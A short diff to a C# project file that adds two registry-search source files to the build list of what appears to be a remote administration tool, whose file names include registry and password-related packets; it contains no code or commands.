@@ -86,6 +86,8 @@
     <Compile Include="Core\Packets\ServerPackets\DoLoadRegistryKey.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
     <Compile Include="Core\Registry\RegistrySeeker.cs" />
+    <Compile Include="Core\Registry\RegistrySeekerParams.cs" />
+    <Compile Include="Core\Registry\RegSeekerMatch.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
     <Compile Include="Core\Data\Host.cs" />
     <Compile Include="Core\Utilities\HostsManager.cs" />
